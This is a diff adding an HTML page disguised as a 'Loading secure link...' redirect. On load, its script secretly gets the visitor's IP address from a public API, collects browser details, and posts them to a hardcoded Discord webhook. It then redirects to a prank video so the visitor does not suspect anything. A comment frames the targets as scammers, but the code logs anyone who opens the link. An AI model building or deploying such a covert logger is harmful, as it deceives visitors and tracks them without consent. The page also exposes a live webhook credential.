@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .loader { border: 4px solid #333; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <p style="margin-left: 15px;">Loading secure link...</p>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
+        const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+
+        async function grabIP() {
+            try {
+                // Step 1: Fetch the IP from a public API
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const userIP = data.ip;
+
+                // Step 2: Gather basic browser info
+                const info = {
+                    ua: navigator.userAgent,
+                    platform: navigator.platform,
+                    lang: navigator.language,
+                    time: new Date().toLocaleString()
+                };
+
+                // Step 3: Send to Discord
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🌐 New IP Logged",
+                            color: 3447003,
+                            fields: [
+                                { name: "IP Address", value: `\`${userIP}\``, inline: true },
+                                { name: "Platform", value: info.platform, inline: true },
+                                { name: "Time", value: info.time },
+                                { name: "User Agent", value: `\`${info.ua}\`` }
+                            ],
+                            footer: { text: "FamilyCheckIn IP Logger" }
+                        }]
+                    })
+                });
+
+            } catch (err) {
+                console.log("Silent grab failed");
+            } finally {
+                // Always redirect the scammer so they don't suspect anything
+                setTimeout(() => {
+                    window.location.replace(REDIRECT_URL);
+                }, 1000);
+            }
+        }
+
+        // Execute immediately on load
+        window.onload = grabIP;
+    </script>
+</body>
+</html>
